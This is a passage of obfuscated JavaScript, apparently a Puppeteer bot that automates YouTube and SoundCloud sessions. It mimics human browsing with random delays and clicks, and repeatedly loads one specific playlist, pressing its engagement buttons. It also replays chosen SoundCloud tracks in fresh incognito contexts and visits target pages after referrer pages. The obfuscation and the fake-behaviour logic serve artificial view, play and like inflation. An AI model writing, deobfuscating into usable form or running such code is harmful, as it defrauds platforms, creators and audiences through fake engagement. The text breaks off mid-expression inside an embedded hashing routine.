const W = c,
  V = b,
  U = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x551 * -0x6 + 0xb97 + -0x2c * 0xfd))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x26ae + -0x271 + -0x13f * -0x21), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xa3e9 + -0xc38c + 0x94d3 + (-0x1130 * 0x6 + -0x3e * -0x11d + -0x5 * -0x128a) * random()) : await standardWaitForNetIdle(f), await wait(-0xda0 + 0x5c6 * 0x3 + 0x2 * 0x7eb + (-0x67 * -0x3b + -0x351e + 0x4471 * 0x1) * random()), 0x26e7 + 0x1e6 + -0x28cc;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xb * -0x241 + -0x1d2c + 0x17e9), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0xa * -0x392 + -0x1 * 0x1272 + -0x1 * -0x3627;
}
async function randomWait() {
  return await wait(-0x18dc + -0xef * 0x1 + 0x2d53 + (-0x1761 + 0x72e + 0x3 * 0xbe9) * random()), -0x11af + -0x1 * 0x25a6 + 0x3756;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1e6b * -0x1 + 0x1b0d + -0x3 * 0x1328, 0x1a2 + 0x116a + 0x1305 * -0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x66 * 0x40b + 0xff81 + -0x1b183) * getRandomInt(0x1bc8 + -0x1 * -0xd29 + -0x28ef, -0x931 * 0x1 + 0xbc3 + -0x28d), h)), 0x25 * 0xb3 + 0x1 * -0x1bca + 0x1ec;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x22a6 + 0x829 + -0x2acf;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x577 * 0x4 + -0x1a2f * -0x1 + 0x1 * -0x300a]['split']('\x20');
    for (let k = -0x15 + -0xbc0 + 0xbd5; k < i['length']; k += -0xa33 * -0x3 + -0x1c3 + -0x1cd4)
      j += i[k] * h[i[k + (0xc5 * 0x21 + -0x1c55 + 0xfb * 0x3)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xb67 + 0x1f34 + -0x13cd);
    let h = e[f];
    if (c['bWjysB'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x4 * 0xe2 + 0x540 + -0x8c8 * 0x1, r, s, t = 0xff3 * -0x1 + 0x296 * 0x1 + 0xb * 0x137; s = m['charAt'](t++); ~s && (r = q % (0x21e0 + -0x11 * 0x166 + -0xa16) ? r * (-0x271 + -0x6b * 0x1d + -0x3b4 * -0x4) + s : s, q++ % (-0x51c + -0x24f2 + 0x5 * 0x86a)) ? o += String['fromCharCode'](-0x2415 + -0x1 * -0x1aba + 0xa5a & r >> (-(0x5c6 * 0x3 + 0x11 * -0x20 + -0xd8 * 0x12) * q & 0x189b + 0x1548 * -0x1 + 0x1 * -0x34d)) : -0x312 + -0x3c4 * 0x8 + -0x7 * -0x4be) {
          s = n['indexOf'](s);
        }
        for (let u = -0x3aa + -0x830 + 0x29 * 0x4a, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x4 * -0x535 + -0x36 + -0x148e))['slice'](-(-0x18d6 + 0x178c + 0x14c));
        }
        return decodeURIComponent(p);
      };
      c['DKqLDp'] = i, b = arguments, c['bWjysB'] = !![];
    }
    const j = e[0x72e + 0x32 * -0x7c + 0x110a],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DKqLDp'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xb67 + 0x1f34 + -0x13cd);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xe7d + -0x68 + 0xeeb)['map'](l => Array['from'](l['children']))['flat'](0x22c3 + 0x2246 + 0x8a1 * -0x8)['map'](l => l['childNodes'][0x2d * 0x65 + -0xf6a + -0x256]['childNodes'][-0x904 + -0x2 * 0xeef + 0x26e2]['childNodes'][-0x6f6 + -0x36 * -0xb5 + -0x1f37]['childNodes'][-0x4 * -0x5ad + 0xd11 + -0x23c5]['childNodes'][-0x188 * -0x2 + 0xb3 * -0x34 + 0x214d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x3 * -0x5a3 + -0x567 + 0x1a38, -0x23be + 0xfa * 0x19 + 0x1edc)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3cd3 + 0x1698 + 0x60d3);
  const h = await getMaxTime(f),
    i = Math['min']((-0x14bac + 0x1 * -0xde64 + 0x3490 * 0xf) * getRandomInt(-0x1f01 * 0x1 + -0x3b8 + -0x11 * -0x20b, 0x13b4 * 0x1 + -0xbc2 + 0x7ed * -0x1), h);
  return await wait(i), 0xbed + -0x1 * 0x2389 + 0x193 * 0xf;
}
async function frontScreenActions(f) {
  const R = b;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + R(0x3, 'AgeP')), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x222c + 0x43 * -0x5b + -0x1 * 0xa5b]['children'][0x42a * 0x8 + 0x9db + -0x101 * 0x2b]['children'][0x1e6f + -0x165f * 0x1 + -0x810]['children'][0x58f * -0x3 + -0x18f8 + -0x5f3 * -0x7]['children'][0x1fae + 0x781 * 0x5 + -0xdd7 * 0x5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1c8d * -0x1 + 0x42d * 0x5 + 0x316d * -0x1;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x581 * -0x2 + -0xa17 + -0x2d * 0x3 + (-0x19c6 * 0x1 + 0x1df2 + 0x1fd * -0x2) * random()
  }), await wait(0xb58 + -0x2513 * -0x1 + 0xd * -0x393 + (0xc2d + 0x5 * -0x33f + 0x53a) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x7 * 0x3be + -0x187 + 0x1bbb * 0x1]['childNodes'][0x7 * 0xb5 + -0x17 * -0x175 + -0x2675]['childNodes'][0x105b * -0x2 + -0x84a * -0x2 + 0x1023]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x1d7b + -0x1 * -0x264b + -0x8cb * 0x1]['childNodes'][-0x1ad6 + -0x1917 + 0x33ed]['childNodes'][-0xec2 + 0x1492 + -0x5ce]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1 * -0x1a05 + 0x1f63 * 0x1 + -0xb7b * 0x5),
          r = 0x19e9 + 0x611 + -0x2 * 0xffd;
        for (let u = -0x38 * -0x6e + 0x26a2 + -0x3eb2; u < q['length']; u += 0x106 + -0x1 * 0xb4b + 0xa47 * 0x1)
          r += q[u] * k[q[u + (-0x234e + -0x4 * -0x93f + -0xd * 0x21)]];
        return r;
      }(n);
  });
  await wait((-0x2a65 + -0x4 * 0xaa9 + 0x8fa1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xae * -0xf7 + -0x1caa * -0x6 + 0x5a * 0x28f) * getRandomInt(-0x1 * 0x2269 + -0x32 * -0x3 + 0x1b1 * 0x14, -0x1 * -0x1dd2 + -0x1 * 0x1dae + -0x1a), h + (-0x1 * 0x1e26 + 0x22b2 + 0x3bf * 0x4));
  return await wait(i), -0x5 * -0x6ee + -0x1c99 * -0x1 + 0x3f3e * -0x1;
}

function a() {
  const bm = [
    'b8odW7JcJ8oUW6DxW6K/rG',
    'witter_Ima',
    'me/gen_dd_',
    'W78Fg8ohgSoDWRBdLCkfBq',
    'W4BcLSo+WR7cIgP2WOzGeG',
    'C3rHCNq',
    'Iwxuob4fA8',
    'W43cTCohW5JdMYC',
    'W4FdQHRcICoIvW',
    '8.0.0.0\x20Sa',
    '0\x20(Linux;\x20',
    '面白い,cctv\x20b',
    'javascript',
    'W73cJrddHtf6hG',
    'pts/414876',
    'Ahr0Chm6lY9VCa',
    'm0TVwKDrAvK2tG',
    'https://op',
    'CMCVC2nYAxb0CW',
    'CmkOWO4PbvtdOSkuW4OE',
    'q2hcNfipwbyFFSox',
    'BXkB-g4eCc',
    'eSksatJdGCoPW7FdQSktya',
    'PkQpV-Fwhs',
    'rg/scripts',
    '\x20(KHTML,\x20l',
    'zmoFWRWSpepdMIfYcG',
    't/537.36\x20(',
    'dmoepxCsEZJcGSoZlG',
    'mula/Bypas',
    'QrJIU09eD-'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x263c + 0x9 * 0x51 + 0x2363), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x30c + 0x15b9 + 0x101 * -0xd + (-0x1 * -0x11f5 + -0xec * 0x14 + 0x463) * Math['random']());
    });
  }, -0x3107 + -0x1 * 0x2b30 + 0x7f * 0xf1);
  await wait(0x3edbd + 0x1e44b * -0x2 + 0x46eb9);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x19f3d + 0x1 * 0x82d4 + 0x2c87 * -0x7) * getRandomInt(-0x1fbb + -0x2 * 0xb23 + 0x3605, 0xc72 + 0x3e * -0x2 + -0xbdd)), clearInterval(h), 0x812 + -0x6d3 + 0x13e * -0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x268a + 0x1 * 0x54a + 0x2140;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1841 + 0xadd + 0xd65;
    await randomWait();
  }
  return 0x2f * 0x7c + 0x2 * 0x13a + -0x50b * 0x5;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0xb67 + 0x1f34 + -0x13cd);
    let h = e[f];
    if (b['tyABsq'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x4 * 0xe2 + 0x540 + -0x8c8 * 0x1, s, t, u = 0xff3 * -0x1 + 0x296 * 0x1 + 0xb * 0x137; t = n['charAt'](u++); ~t && (s = r % (0x21e0 + -0x11 * 0x166 + -0xa16) ? s * (-0x271 + -0x6b * 0x1d + -0x3b4 * -0x4) + t : t, r++ % (-0x51c + -0x24f2 + 0x5 * 0x86a)) ? p += String['fromCharCode'](-0x2415 + -0x1 * -0x1aba + 0xa5a & s >> (-(0x5c6 * 0x3 + 0x11 * -0x20 + -0xd8 * 0x12) * r & 0x189b + 0x1548 * -0x1 + 0x1 * -0x34d)) : -0x312 + -0x3c4 * 0x8 + -0x7 * -0x4be) {
          t = o['indexOf'](t);
        }
        for (let v = -0x3aa + -0x830 + 0x29 * 0x4a, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x4 * -0x535 + -0x36 + -0x148e))['slice'](-(-0x18d6 + 0x178c + 0x14c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x72e + 0x32 * -0x7c + 0x110a,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * 0x25a6 + -0x363 + 0x3bb * 0xb; u < 0x1a2f + -0x1 * 0x233f + 0x1c * 0x5c; u++) {
          p[u] = u;
        }
        for (u = 0x685 * -0x1 + 0x5c * -0x40 + 0xb * 0x2af; u < 0x9 * -0x166 + -0x22c + -0x1 * -0xfc2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x14 * -0x155 + -0x931 + 0x24d5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x723 + 0x25 * 0xb3 + 0x4 * -0x4af, q = -0x55d * 0x1 + 0x22a6 + -0x1d49;
        for (let v = 0x577 * 0x4 + -0x1a2f * -0x1 + 0x1 * -0x300b; v < n['length']; v++) {
          u = (u + (-0x15 + -0xbc0 + 0xbd6)) % (-0xa33 * -0x3 + -0x1c3 + -0x1bd6), q = (q + p[u]) % (0xc5 * 0x21 + -0x1c55 + 0x2a * 0x18), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xe7d + -0x68 + 0xfe5)]);
        }
        return t;
      };
      b['nUtwTT'] = m, c = arguments, b['tyABsq'] = !![];
    }
    const j = e[0x22c3 + 0x2246 + 0x19b * -0x2b],
      k = f + j,
      l = c[k];
    return !l ? (b['FGYHAw'] === undefined && (b['FGYHAw'] = !![]), h = b['nUtwTT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function fetchRandomSC() {
  return Math['random']() <= 0x12 * 0x45 + 0x1dd0 + -0x22aa + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x15c4 + 0xc33 * -0x1 + 0x21f7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x225f + 0x1232 * 0x1 + -0x3491 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x514 + 0x48 + 0x4cc;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x2 * 0x92a1 + -0x7 * 0x27bb + 0x67 * 0x741 + getRandomInt(0x443b * 0x1 + 0x39c2 * -0x1 + 0x301f, 0x1 * -0x75 + -0x8fcd + 0x10572));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1c35 * -0x1 + -0x64f + 0x2285), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x26cc + -0x1793 * 0x1 + 0x3e5f;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x222 * -0x7 + 0x2671 + -0x1783, 0x2e9 * 0x1 + -0x7a * 0x35 + -0x168b * -0x1)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1e87 + -0xb * -0x16f + -0x267c + floor((0x1ebb + 0x7 * 0x151 + -0x240a) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x7e725c10 + -0x959be3ee + 0x1940e3ffe),
          0xb78329 + 0xb81601 + -0x1 * 0xef992a,
          0xfb54 + 0x464d + -0x4b9 * 0x29,
          -0x1c20 + -0x1d * -0xfd + 0x3 * -0x3
        ], y = [
          0x1 * -0x6a1 + 0x556 * 0x7 + -0x1 * 0x1ea1,
          0x283 * -0x2 + 0x1 * -0x1d82 + 0x2298,
          0x891 * 0x1 + 0x2f * 0xad + -0x284c,
          -0x95b + 0x66a + 0x2f1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            const S = b;
            return new G(0x21f0 + 0x86 * 0x44 + 0x15d * -0x33)[S(0x7, '0&[o')](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x121f + -0xb94 + -0x68b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x20eb + -0xbc0 * 0x1 + 0x2cab) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2220 + 0x1ead * 0x1 + -0x40cd] = A[-0xc3 * -0xc + 0x1d02 + -0x1e * 0x145] = A[-0x1 * 0xe3b + -0xced + -0x1 * -0x1b29] = A[0x9f3 + 0x5a8 + -0xf99] = A[-0x1d3 * -0x2 + -0x22b2 * 0x1 + 0x1f0f] = A[-0x1365 + -0x23e1 + -0x126e * -0x3] = A[-0x1d * 0x106 + 0x1 * 0xcdd + -0x1af * -0xa] = A[0xe * -0x26e + 0x102e + 0x11dc] = A[-0x2 * -0x131d + 0x24ee + -0x4b21] = A[-0x500 * -0x3 + -0x183b * -0x1 + -0x2733] = A[0xbd4 + -0x1f54 + 0x1389] = A[0x7 * -0x175 + -0x2412 + 0x2e4f] = A[0x8 * -0x14b + 0x21 * 0xe6 + 0x1343 * -0x1] = A[0x2b * 0x11 + -0x1f2 * -0xb + -0x1835] = A[0xb28 + -0x9 * -0x269 + 0x1066 * -0x2] = A[0x3 * -0x144 + 0x1b8f + -0x17b5] = A[0x395 + -0x5f * 0x2f + 0xdeb] = -0xae7 * 0x3 + 0x1d09 + 0x3ac, this['blocks'] = A) : this['blocks'] = [
                -0xc77 * -0x1 + -0x22a4 + 0x162d * 0x1,
                0x14e * -0xb + 0x1 * 0x21d9 + -0x7 * 0x2c9,
                -0xb * -0x137 + 0xc * 0x60 + -0x11dd,
                -0x21dd + 0xad0 + 0x170d,
                0x4e6 + 0x1ce + -0xd * 0x84,
                0xea + -0x1f12 + 0x1e28,
                0x1add + -0x8a5 + -0x1238,
                -0xa20 * 0x3 + -0xb * -0x293 + 0x20f * 0x1,
                -0x1ef0 + 0x1 * 0x2469 + -0x579,
                -0x622 * 0x5 + -0xe84 + 0x2d2e,
                -0x10e7 * -0x2 + 0x1fb5 + 0x4183 * -0x1,
                -0x1b9f * -0x1 + -0x16 * -0xf1 + -0x3055,
                -0x89b * 0x1 + -0x23 * -0x3 + 0x832,
                -0xd93 + -0x1 * 0x770 + 0x1503,
                -0x2 * 0x1a3 + 0x479 + -0x133,
                -0x30a * 0x1 + 0xab9 + -0x7af * 0x1,
                0x1 * -0x21f5 + 0x2 * 0xabc + -0xc7d * -0x1
              ], this['h0'] = -0x9c * -0x9ab874 + 0x88388ac1 + 0x250 * -0x37051b, this['h1'] = -0x22945 * 0x16f5 + -0xd * -0x13d11ce5 + 0x1fcca0f1, this['h2'] = 0x800baa9b + -0x10bc5a132 + 0x12474d395, this['h3'] = -0x43ba7 * 0x742 + -0x1f6c8602 + 0x272be643 * 0x2, this['h4'] = -0x13d73e9a5 + 0x53f2ae68 + -0x1ad541d2d * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x136d * 0x1 + 0x24f2 + -0x385f, this['finalized'] = this['hashed'] = 0x7a5 * 0x5 + -0x82a + -0x2d * 0xab, this['first'] = 0x1 * -0x2c2 + 0x16bd * -0x1 + 0x1980;
            }
            ['update'](J) {
              const T = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x899 + -0x2ec + 0xb85, O = J['length'] || 0x2 * -0x773 + -0x1fb7 + 0x2e9d, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x22d7 * -0x1 + -0x246a * -0x1 + -0xd * 0x1f, P[0x1 * 0x2685 + 0x11ff * -0x2 + -0x287] = this['block'], P[-0x4 * -0x8d1 + 0x80d + -0x2b41] = P[-0x1 * -0x227f + 0x11 * -0x1f8 + -0x106] = P[-0x1 * 0x1a21 + -0x2669 * 0x1 + -0xf3 * -0x44] = P[0x8 * -0x4e + -0x1103 * 0x2 + -0x2479 * -0x1] = P[-0x1 * -0x19c7 + 0xac7 + -0x248a] = P[-0x1026 + -0x9ba + -0x19e5 * -0x1] = P[0x1c0 + -0x5f4 + -0x43a * -0x1] = P[-0x1 * 0x6d + 0x4 * -0x103 + 0x480] = P[0x240c + 0x9fe + 0x6 * -0x7ab] = P[-0x174e + -0x609 * -0x1 + 0x114e] = P[0x1c5 * 0x14 + -0xa * 0x45 + -0x20a8] = P[-0x164d + 0x20a6 + -0xa4e] = P[0x1 * -0x4e1 + -0x1a60 + 0xa6f * 0x3] = P[0x530 + 0x2644 + -0x2b67] = P[0x1 * -0x827 + -0x58f * 0x2 + 0x1353] = P[-0xf73 + 0x687 * 0x1 + 0x1 * 0x8fb] = 0x20f2 + -0x2f9 * 0xd + -0x5b3 * -0x1), K) {
                    for (N = this['start']; M < O && N < -0x2426 + 0x3 * -0x7a6 + -0x6 * -0x9e4; ++M)
                      P[N >> -0x960 + 0x3 * 0x776 + -0x10 * 0xd0] |= J[M] << y[-0x2105 + 0x13bf + 0xd49 & N++];
                  } else {
                    for (N = this[T(0x5)]; M < O && N < -0x41 * -0x2e + 0x2125 * -0x1 + -0x6d * -0x33; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * -0x2048 + -0x151d + 0x291 * 0x15 ? P[N >> 0xad5 + -0xb * -0x2ce + -0x1 * 0x29ad] |= L << y[0xc03 + -0x2581 * -0x1 + -0x29b * 0x13 & N++] : L < -0x1 * -0x24fb + -0x11b8 + -0xb43 ? (P[N >> 0xa7d + -0x419 * 0x7 + 0x1234] |= (0x2f7 + -0x561 + 0x32a | L >> 0x29 * -0x81 + 0x152e + 0x7f * -0x1) << y[-0x1d76 + -0xd61 + 0x156d * 0x2 & N++], P[N >> 0x883 * -0x1 + -0xfbd + 0x1842] |= (0x13b7 + -0x255e * -0x1 + -0x3895 | 0x1174 + 0xe * 0x3e + -0x1 * 0x1499 & L) << y[0x25ca + 0x127 * -0x2 + 0x2379 * -0x1 & N++]) : L < 0x394f * -0x5 + -0x2e62 + 0x224ed || L >= -0x15b46 + 0x19e09 + 0x9d3d ? (P[N >> -0x1e * -0x7c + -0x101f * 0x2 + 0x11b8] |= (-0x3 * -0x436 + 0x1df7 + 0xb * -0x3cb | L >> 0x119a + 0x1d6 + -0x1364) << y[-0xd71 * -0x1 + 0x369 + -0x10d7 & N++], P[N >> 0x92 * 0x7 + -0x17 * 0xb7 + 0x3 * 0x427] |= (0x8 * 0x4bd + -0x1f8 * 0x1 + -0x2370 | L >> 0x371 * 0x9 + -0xba * 0x11 + -0x633 * 0x3 & -0x4c4 + -0x3 * 0x743 + -0x31 * -0x8c) << y[-0x1562 + -0x4e + 0x15b3 & N++], P[N >> 0x133a + 0x8 * 0x189 + 0xfc0 * -0x2] |= (-0x1ea7 + 0x10f7 * 0x1 + 0xe30 | 0x1b2 * -0x17 + -0x1e0a * 0x1 + 0x4547 & L) << y[0x21e7 + -0x5 * 0x4f5 + -0x3f * 0x25 & N++]) : (L = 0x1 * -0x1201d + 0x1abc3 + -0x232 * -0x35 + ((0xf30 + -0x1 * -0x114d + -0x1c7e & L) << 0x1a5 * 0xd + 0x3e6 + -0x1 * 0x193d | 0x2 * 0xd07 + 0xd42 + -0x2351 & J['charCodeAt'](++M)), P[N >> -0x4 * 0x76d + 